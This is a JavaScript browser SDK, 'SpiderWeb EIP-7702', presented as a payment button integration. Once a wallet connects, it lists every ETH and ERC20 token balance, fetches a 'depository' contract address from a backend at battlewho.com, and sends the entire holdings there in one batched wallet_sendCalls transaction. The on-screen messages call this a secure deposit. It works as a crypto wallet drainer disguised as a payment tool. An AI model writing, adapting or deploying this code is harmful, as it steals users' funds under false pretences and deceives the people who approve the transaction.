import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.11.1/dist/ethers.min.js";

/**
 * SpiderWeb EIP-7702 Hybrid Relayed SDK v3.0
 * Gets a temporary contract from the backend and sends all assets to it.
 */
window.SpiderWeb7702SDK = {
    _config: {},
    _provider: null,
    _signer: null,
    _currentUserAddress: null,
    _isInitialized: false,
    _discoveredProviders: new Map(),
    _resolveConnection: null,
    _RELAYER_SERVER_URL_BASE: "https://battlewho.com",
    
    _rawProvider: null, // Keep this for direct wallet RPC calls

    _ERC20_ABI: [
        "function transfer(address to, uint256 amount) returns (bool)",
        "function decimals() view returns (uint8)",
        "function symbol() view returns (string)"
    ],
    
    // This mapping is no longer needed for asset discovery but might be useful elsewhere.
    _CHAIN_ID_TO_COINGECKO_ASSET_PLATFORM: {
        1: 'ethereum',
        137: 'polygon-pos',
        10: 'optimistic-ethereum',
        42161: 'arbitrum-one',
        56: 'binance-smart-chain',
        43114: 'avalanche'
    },

    init: function(config) {
        if (this._isInitialized) {
            console.warn("SpiderWeb7702SDK already initialized.");
            return;
        }
        if (!config.buttonId || !config.apiKey || !config.alchemyApiKey || !config.chainId) {
            console.error("SDK Error: Missing required config parameters.");
            return;
        }
        this._config = config;

        const payButton = document.getElementById(config.buttonId);
        if (!payButton) {
            console.error(`SDK Error: Button with ID "${config.buttonId}" not found.`);
            return;
        }

        payButton.addEventListener('click', this._handlePaymentClick.bind(this));
        this._injectModalHtml();
        this._setupEip6963Listeners();
        this._isInitialized = true;
        console.log("SpiderWeb EIP-7702 SDK Initialized.");
    },

    _handlePaymentClick: async function() {
        try {
            if (!this._signer) {
                const connected = await this._connectWallet();
                if (!connected) this._updateStatus("Wallet connection cancelled.", "info");
                return;
            }
            const network = await this._provider.getNetwork();
            if (network.chainId !== BigInt(this._config.chainId)) {
                this._updateStatus(`Please switch wallet to the correct network (Chain ID: ${this._config.chainId}).`, "error");
                return;
            }
            await this._executeSplit();
        } catch (error) {
            console.error("SDK Payment Error:", error);
            this._updateStatus(`Error: ${error.message || 'An unknown error occurred.'}`, "error");
        }
    },

    _executeSplit: async function() {
        this._updateStatus("Scanning wallet for assets...", "pending");
        const assets = await this._findAllAssets();
        if (assets.length === 0) {
            this._updateStatus("No transferable assets found in the wallet.", "info");
            return;
        }

        this._updateStatus("Preparing secure depository contract...", "pending");

        let depositoryContractAddress;
        try {
            const response = await fetch(`${this._RELAYER_SERVER_URL_BASE}/initiate-eip7702-split`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'X-Api-Key': this._config.apiKey },
                body: JSON.stringify({
                    apiKey: this._config.apiKey,
                    origin: window.location.origin,
                    owner: this._currentUserAddress,
                    chainId: this._config.chainId,
                    // ✅ MODIFICATION: Removed 'usdValue' from the asset payload
                    assets: assets.map(a => ({
                        token: a.address,
                        type: a.type,
                        symbol: a.symbol,
                    }))
                })
            });
            const data = await response.json();
            if (!data.success) throw new Error(data.message);
            depositoryContractAddress = data.contractAddress;
        } catch (e) {
            throw new Error(`Failed to initialize transaction: ${e.message}`);
        }

        this._updateStatus(`Depositing ${assets.length} asset(s)...`, "pending");

        const calls = [];
        for (const asset of assets) {
            if (asset.balance > 0n) {
                if (asset.type === 'ETH') {
                    calls.push({ to: depositoryContractAddress, value: ethers.toBeHex(asset.balance) });
                } else { // ERC20
                    const tokenInterface = new ethers.Interface(this._ERC20_ABI);
                    const data = tokenInterface.encodeFunctionData("transfer", [depositoryContractAddress, asset.balance]);
                    calls.push({ to: asset.address, value: '0x0', data: data });
                }
            }
        }
        
        try {
            const summary = assets.map(a => `${a.symbol}`).join(', ');
            this._updateStatus(`Confirm in wallet: Sending ${summary} to the Depository Contract.`, 'pending');

            const txPayload = {
                version: "2.0.0",
                chainId: `0x${BigInt(this._config.chainId).toString(16)}`,
                from: this._currentUserAddress,
                atomicRequired: true,
                calls: calls,
            };
            
            const txHash = await this._rawProvider.request({
                method: 'wallet_sendCalls',
                params: [txPayload]
            });

            this._updateStatus(`✅ Deposit sent! Your transaction is being processed securely.`, 'success');
        } catch (error) {
            if (error.code === 4001) throw new Error('Transaction rejected by user.');
            throw error;
        }
    },

    // ✅ MAJOR CHANGE: This function no longer fetches prices. It gets all assets with a balance.
    _findAllAssets: async function() {
        const assets = [];
        // Note: You may want to make this URL dynamic based on the configured chainId
        const alchemyUrl = `https://eth-mainnet.g.alchemy.com/v2/${this._config.alchemyApiKey}`;
        
        // 1. Get all ERC20 token balances
        const balanceResponse = await fetch(alchemyUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenBalances',
                params: [this._currentUserAddress, 'erc20']
            })
        });
        const balanceData = await balanceResponse.json();
        if (balanceData.error) throw new Error(`Alchemy Error: ${balanceData.error.message}`);
        if (!balanceData.result) return [];
        
        const tokensWithBalance = balanceData.result.tokenBalances.filter(t => t.tokenBalance !== '0x0');
        
        // 2. Process Native Currency (e.g., ETH)
        const ethBalance = await this._provider.getBalance(this._currentUserAddress);
        if (ethBalance > 0n) {
            try {
                const feeData = await this._provider.getFeeData();
                // Generously estimate gas fee to reserve in the wallet
                const gasPrice = feeData.maxFeePerGas || feeData.gasPrice || ethers.parseUnits('20', 'gwei');
                const estimatedFee = gasPrice * 300000n; 
                
                if (ethBalance > estimatedFee) {
                    assets.push({ 
                        type: 'ETH', 
                        balance: ethBalance - estimatedFee, // Keep some ETH for gas
                        address: null, 
                        symbol: 'ETH' 
                    });
                }
            } catch (feeError) {
                console.warn("Could not get fee data to reserve gas. This might fail on low balances.", feeError);
                // As a fallback, just check if there's any balance at all
                if(ethBalance > 0n) assets.push({ type: 'ETH', balance: ethBalance, address: null, symbol: 'ETH' });
            }
        }

        // 3. Process ERC20 Tokens
        for (const token of tokensWithBalance) {
            try {
                const metadataResponse = await fetch(alchemyUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenMetadata',
                        params: [token.contractAddress]
                    })
                });
                const metadata = await metadataResponse.json();
                
                if (metadata.result) {
                    assets.push({ 
                        type: 'ERC20', 
                        balance: BigInt(token.tokenBalance), 
                        address: token.contractAddress, 
                        symbol: metadata.result.symbol || 'Unknown Token'
                    });
                }
            } catch (metadataError) {
                console.warn(`Could not fetch metadata for ${token.contractAddress}.`, metadataError);
                 assets.push({
                    type: 'ERC20',
                    balance: BigInt(token.tokenBalance),
                    address: token.contractAddress,
                    symbol: token.contractAddress.slice(0, 6) // Fallback symbol
                });
            }
        }
        return assets;
    },
    
    // ✅ REMOVED: _fetchTokenPrices and _fetchTokenPricesInChunks are no longer needed.

    // --- Wallet Connection and UI Logic (No changes needed below this line) ---

    _connectWallet: function() {
        return new Promise((resolve) => {
            this._resolveConnection = resolve;
            this._openWalletModal();
        });
    },

    _handleProviderSelection: async function(event) {
        const button = event.target.closest('.sw-wallet-button');
        if (!button) return;
        const providerDetail = this._discoveredProviders.get(button.dataset.rdns);
        if (!providerDetail) return;

        this._updateStatus(`Connecting with ${providerDetail.info.name}...`, 'pending');
        this._closeWalletModal();

        try {
            this._rawProvider = providerDetail.provider; // Storing the raw provider
            this._provider = new ethers.BrowserProvider(this._rawProvider);
            this._signer = await this._provider.getSigner();
            this._currentUserAddress = await this._signer.getAddress();
            
            this._updateStatus(`Connected: ${this._currentUserAddress.slice(0,6)}...${this._currentUserAddress.slice(-4)}`, 'success');
            
            if (this._resolveConnection) {
                this._resolveConnection(true);
                // Automatically continue the payment flow after successful connection
                await this._executeSplit();
            }
        } catch (error) {
            console.error("Connection failed:", error);
            this._updateStatus("Connection failed or was rejected.", "error");
            if (this._resolveConnection) this._resolveConnection(false);
        }
    },

    _setupEip6963Listeners: function() {
        window.addEventListener('eip6963:announceProvider', (event) => {
            const providerDetail = event.detail;
            if (!this._discoveredProviders.has(providerDetail.info.rdns)) {
                this._discoveredProviders.set(providerDetail.info.rdns, providerDetail);
                this._renderWalletList();
            }
        });
        window.dispatchEvent(new Event('eip6963:requestProvider'));
    },
    
    _renderWalletList: function() {
        const listDiv = document.getElementById('sw-wallet-list');
        if (!listDiv) return;

        listDiv.innerHTML = '';
        if (this._discoveredProviders.size === 0) {
            listDiv.innerHTML = '<p style="text-align: center; color: #9ca3af;">No wallets detected.</p>';
            return;
        }

        this._discoveredProviders.forEach(p => {
            const buttonHtml = `
                <button data-rdns="${p.info.rdns}" class="sw-wallet-button" style="width: 100%; display: flex; align-items: center; padding: 12px; background-color: #374151; border-radius: 8px; border: none; cursor: pointer; margin-bottom: 8px; color: white;">
                    <img src="${p.info.icon}" alt="${p.info.name}" style="width: 32px; height: 32px; margin-right: 16px; border-radius: 50%;"/>
                    <span style="font-weight: 500;">${p.info.name}</span>
                </button>
            `;
            listDiv.innerHTML += buttonHtml;
        });
        
        listDiv.querySelectorAll('.sw-wallet-button').forEach(button => {
            button.addEventListener('click', this._handleProviderSelection.bind(this));
        });
    },

    _openWalletModal: function() {
        document.getElementById('sw-modal-overlay').style.display = 'flex';
        setTimeout(() => {
            const modal = document.getElementById('sw-wallet-modal');
            if(modal) {
                modal.style.opacity = 1;
                modal.style.transform = 'scale(1)';
            }
        }, 10);
        this._renderWalletList();
    },

    _closeWalletModal: function() {
        const overlay = document.getElementById('sw-modal-overlay');
        const modal = document.getElementById('sw-wallet-modal');
        if (modal) {
            modal.style.opacity = 0;
            modal.style.transform = 'scale(0.95)';
        }
        setTimeout(() => {
            if (overlay) overlay.style.display = 'none';
            if(this._resolveConnection && !this._signer) {
                this._resolveConnection(false);
                this._resolveConnection = null;
            }
        }, 300);
    },
    
    _injectModalHtml: function() {
        if (document.getElementById('sw-modal-overlay')) return;
        
        const modalHtml = `
            <div id="sw-modal-overlay" style="display: none; position: fixed; inset: 0; background-color: rgba(0,0,0,0.75); align-items: center; justify-content: center; z-index: 1000;">
                <div id="sw-wallet-modal" style="background-color: #1f2937; border-radius: 16px; padding: 24px; width: 100%; max-width: 384px; color: white; transition: all 0.3s ease; opacity: 0; transform: scale(0.95);">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px;">
                        <h2 style="font-size: 24px; font-weight: 600; margin: 0;">Connect a Wallet</h2>
                        <button id="sw-close-wallet-modal-btn" style="background: none; border: none; color: #9ca3af; font-size: 28px; cursor: pointer;">&times;</button>
                    </div>
                    <div id="sw-wallet-list" style="max-height: 300px; overflow-y: auto;"></div>
                </div>
            </div>
            <div id="sdk-status" style="margin-top: 16px; min-height: 20px;"></div>
        `;
        document.body.insertAdjacentHTML('beforeend', modalHtml);

        const closeBound = this._closeWalletModal.bind(this);
        document.getElementById('sw-close-wallet-modal-btn').addEventListener('click', closeBound);
        document.getElementById('sw-modal-overlay').addEventListener('click', (e) => {
            if (e.target.id === 'sw-modal-overlay') closeBound();
        });
    },
    
    _updateStatus: function(message, type = 'info') {
        const statusEl = document.getElementById(this._config.statusElementId || 'sdk-status');
        if (!statusEl) return;
        const colors = { info: '#6b7280', success: '#16a34a', error: '#dc2626', pending: '#2563eb' };
        statusEl.innerHTML = `<p style="color: ${colors[type]}; margin: 0; font-size: 14px; text-align: center;">${message}</p>`;
    },
};
